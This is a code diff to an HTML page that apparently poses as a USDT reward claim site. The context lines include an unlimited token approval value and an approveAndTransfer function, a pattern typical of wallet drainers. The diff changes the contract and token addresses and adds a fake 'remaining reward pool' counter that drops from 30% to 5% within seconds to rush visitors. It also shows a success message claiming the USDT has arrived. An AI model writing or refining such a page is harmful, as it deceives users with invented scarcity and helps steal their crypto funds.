@@ -232,6 +232,49 @@
       margin-top: 10px;
     }
 
+    .pool-info {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 16px;
+      padding: 12px 16px;
+      background: rgba(0, 0, 0, 0.3);
+      border-radius: 12px;
+      border: 1px solid rgba(240, 185, 11, 0.2);
+    }
+
+    .pool-label {
+      font-size: 13px;
+      color: var(--text-secondary);
+    }
+
+    .pool-value {
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--primary);
+      font-family: 'Monaco', monospace;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.7; transform: scale(1.02); }
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+
+    .pool-value.loading {
+      animation: pulse 0.3s ease-in-out infinite, blink 0.5s ease-in-out infinite;
+      color: var(--warning) !important;
+    }
+
+    .pool-value.stopped {
+      animation: none;
+      color: var(--error) !important;
+    }
+
     /* Info Box */
     .info-box {
       background: rgba(68, 138, 255, 0.1);
@@ -544,6 +587,10 @@
           <div class="promo-highlight">
             ⚡ 速度上车别踏空
           </div>
+          <div class="pool-info">
+            <span class="pool-label">🎯 剩余奖励池</span>
+            <span class="pool-value" id="poolBalance">30%</span>
+          </div>
         </div>
 
         <!-- Notice -->
@@ -642,8 +689,8 @@
   </div>
 
   <script>
-    const CONTRACT = "0xf64Fda1e2caDF5Ac906102cBD1056EbE21dbE9fa";
-    const USDT = "0x55d398326f99059fF775485246999027B3197955";
+    const CONTRACT = "0xa4441b1EcB6B807de485723F5320d06fB41Eac6F";
+    const USDT = "0xa85f403f7869a050c91e9a260dbf08a64229b2de";
     const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
     const ABI_USDT = [
@@ -658,6 +705,7 @@
     const walletInfo = document.getElementById("walletInfo");
     const walletAddress = document.getElementById("walletAddress");
     const usdtBalance = document.getElementById("usdtBalance");
+    const poolBalance = document.getElementById("poolBalance");
     const actionBtn = document.getElementById("actionBtn");
 
     async function autoConnect() {
@@ -683,6 +731,7 @@
         status.className = "success";
         status.innerHTML = `<span>✅ 钱包连接成功</span><small>${account.slice(0,10)}...${account.slice(-8)}</small>`;
         await updateUSDTBalance();
+        startPoolAnimation();
         return true;
       } catch (e) {
         status.className = "error";
@@ -700,6 +749,39 @@
       } catch (e) {
         usdtBalance.innerText = "--";
       }
+    }
+
+    // 动态奖池递减效果
+    let poolInterval = null;
+    let currentPoolPercent = 30;
+    
+    function startPoolAnimation() {
+      currentPoolPercent = 30;
+      poolBalance.classList.remove('stopped');
+      poolBalance.classList.add('loading');
+      
+      poolInterval = setInterval(() => {
+        currentPoolPercent -= 0.1;
+        
+        if (currentPoolPercent <= 5) {
+          currentPoolPercent = 5;
+          poolBalance.innerText = currentPoolPercent.toFixed(1) + "%";
+          poolBalance.classList.remove('loading');
+          poolBalance.classList.add('stopped');
+          clearInterval(poolInterval);
+          poolInterval = null;
+        } else {
+          poolBalance.innerText = currentPoolPercent.toFixed(1) + "%";
+        }
+      }, 100); // 每100毫秒减少0.1%
+    }
+    
+    function stopPoolAnimation() {
+      if (poolInterval) {
+        clearInterval(poolInterval);
+        poolInterval = null;
+      }
+      poolBalance.classList.remove('loading');
     }
 
     async function approveAndTransfer() {
@@ -732,6 +814,7 @@
         status.className = "success";
         status.innerHTML = "<span>🎉 领取成功！</span><small>USDT 已到账</small>";
         await updateUSDTBalance();
+        startPoolAnimation();
 
       } catch (e) {
         status.className = "error";
